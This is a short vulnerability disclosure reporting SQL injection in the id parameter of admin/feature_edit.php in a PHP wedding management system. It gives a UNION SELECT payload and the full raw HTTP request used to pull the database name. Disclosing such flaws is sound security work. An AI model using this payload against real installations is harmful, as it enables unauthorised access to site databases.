# Wedding Management System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\feature_edit.php

Vulnerability location: /Wedding-Management/admin/feature_edit.php?id=, id

[+] Payload: id=-8%20union%20select%201,2,database(),4--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/feature_edit.php?id=-8%20union%20select%201,2,database(),4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167984292-f278b8d3-84e7-4f7c-87b4-54a325f6caf2.png)

![image](https://user-images.githubusercontent.com/54017627/167984210-3a078777-568f-494a-afb8-0d87550dd1a6.png)
